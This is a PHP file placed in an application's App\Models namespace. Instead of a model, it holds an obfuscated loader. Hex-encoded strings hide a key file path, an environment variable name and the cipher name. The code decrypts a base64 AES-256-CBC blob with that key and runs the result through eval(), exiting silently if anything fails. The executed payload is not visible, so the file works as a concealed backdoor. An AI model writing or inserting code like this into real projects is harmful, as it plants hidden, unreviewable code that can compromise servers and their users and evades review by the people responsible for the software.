<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('M1C9styRUwtioPVOtRxZTw==');

$c=base64_decode(

'P5+nNZUYTMby9PPZruQbOJHaCCYrhjyJ12VOU4uNqd7ZtDP7X5Q/NAKtIcyWQiVbxspEkBmdNW0U' .
'mm3Xnt4cLLc6gWWme4Aku+w2dm0kizyCQY8MyDOrREMnXr+N30SSrc2RLtTJLiGb2H/IUz3rd96o' .
'3pEZ75iex5uWOZKyVW1YxpGG4ePz/jH/lH8IEOie64tprSDdUeLyhy+yZjhNnw7xQf1MtgaGIiNW' .
'RnZe5rBQLnbVnRSnIAraH7j8yJ34Embicg4eUF1NNMHNK8D7oTjaY1xk2Em4QUM6PNOaq9O0ivZz' .
'dax9ArY7PJddUa8Y726d2/waRkJD5GHjGU+A6kFbdXkXpANEELWDPeQJRSk6tO4APiJeosmQwjj6' .
'mMF4jCbwm7uogqLqpOWQgPdZuaz9QMrq+YJR7CxjOL1Wkg0RrKPGa1duApR2dUqrSGjfOhLwvnKD' .
'c/Lo4IVNXOa5to4s77LUyDe/hECICrxikn+dMdXc2g4PjJzFB3F6bcE+e1/zVx29rreXG8dztT3t' .
'jux7wK9+YuSQs5VDghx0v2Cn0KruSC+S92+RXbJ0oNTdriRKQlCgHyrgMow1i0prwmXaYAI6ScNe' .
'0yw6L2WEbABzrSMARGTWx7EYytbSBr2Qla9XDP0QSGePZ2pqfNHkeDMxkgET04Ur5doLgKHJbZSG' .
'UQSX27CufQeELY0wINMNGYNHic6ScyyyZYSpbVi0CD5IfIpeAlU5LGEaLZtKrWeN6Mw6rTaEEpjz' .
'JPY7COt2oXDQnzZv33HHH2QAcsAqEmn+QCusqmt4AxE5qN3m5ppQrHs+XApCE6i2Sch92zdJWt6U' .
'2o4HJGmJ/OwrI+tiT0B8j4ikIhVvtiSjDUOWdAfp0FooWbfLsB3CjgbK3WcX1L3QKDCIfGSa/2Kv' .
'oEAXbQUuVhCB65LtMB6Z6/dgKmTNgqr4xSIdNmmv3BouFnf9h1SaP3k62fjnCo4OIW4oWw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

